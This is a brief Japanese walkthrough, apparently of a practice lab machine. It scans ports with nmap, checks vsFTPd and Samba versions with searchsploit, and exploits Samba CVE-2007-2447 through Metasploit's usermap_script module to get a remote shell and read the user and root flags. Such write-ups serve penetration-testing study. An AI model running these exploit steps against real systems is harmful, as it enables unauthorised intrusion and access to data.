# 1.Port Scan

対象マシンのポートをスキャン

ip=10.10.10.3

`nmap -sC -sV -Pn -p- $ip`

![eaab9b9771f219311fd2145b148960b7.png](../_resources/eaab9b9771f219311fd2145b148960b7.png)

# 2.FTP

ftpサーバに匿名で接続。

手掛かりになるFile無し

![769afbd3127a0f5fcaf3cb46808bf945.png](../_resources/769afbd3127a0f5fcaf3cb46808bf945.png)

# 4.searchsploit

検知したFTPのバージョンで検索

`searchsploit vsFTPd 2.3.4`

![8faa1b2cf94472e75321856f83ab6c8b.png](../_resources/8faa1b2cf94472e75321856f83ab6c8b.png)

対策済みであることを確認

![2a97359ea68c935446e24e8771575430.png](../_resources/2a97359ea68c935446e24e8771575430.png)

searchsploit Samba 3.0.20

![9abdd0fb32da738f1d4be0736e0672ef.png](../_resources/9abdd0fb32da738f1d4be0736e0672ef.png)

unix/remote/16320.rb で検索

CVE-2007-2447 の脆弱性を使用

![da4df3da554534a0ca7578b7f963ad30.png](../_resources/da4df3da554534a0ca7578b7f963ad30.png)

![918d3521012770e28cb388b17079fd2d.png](../_resources/918d3521012770e28cb388b17079fd2d.png)

Metasploit Framework を使用

`msfconsole`

![763d36dab0626ea4c7bbdfa7af387f2f.png](../_resources/763d36dab0626ea4c7bbdfa7af387f2f.png)

今回の脆弱性を検索

`search Samba 3.0.20`

![4bf037d81dfc304218ddc0ce31355c90.png](../_resources/4bf037d81dfc304218ddc0ce31355c90.png)



`use exploit/multi/samba/usermap_script`

![5b4bce16d00c620728c893655e5d41e3.png](../_resources/5b4bce16d00c620728c893655e5d41e3.png)

`show options`

![884f89831fac055df80c84919304adeb.png](../_resources/884f89831fac055df80c84919304adeb.png)

`set rhosts $ip`

`ifconfig`

`set lhosts tun0`

`show options`

![f48e609ae1a9aa30231472387222336f.png](../_resources/f48e609ae1a9aa30231472387222336f.png)

![661baf039931faee1cdf326152bd2302.png](../_resources/661baf039931faee1cdf326152bd2302.png)

`exploit`

![53490d3414d1e11e427291c46674ef15.png](../_resources/53490d3414d1e11e427291c46674ef15.png)

`whoami`

`cd makis`

`ls`

`cat user.txt`

![c9a725c76fafa1f5133c01bd58f0c058.png](../_resources/c9a725c76fafa1f5133c01bd58f0c058.png)

`find -name "root.txt"`

`cat root.txt`

![a9eb2357854bebfa5451e039c7bc2675.png](../_resources/a9eb2357854bebfa5451e039c7bc2675.png)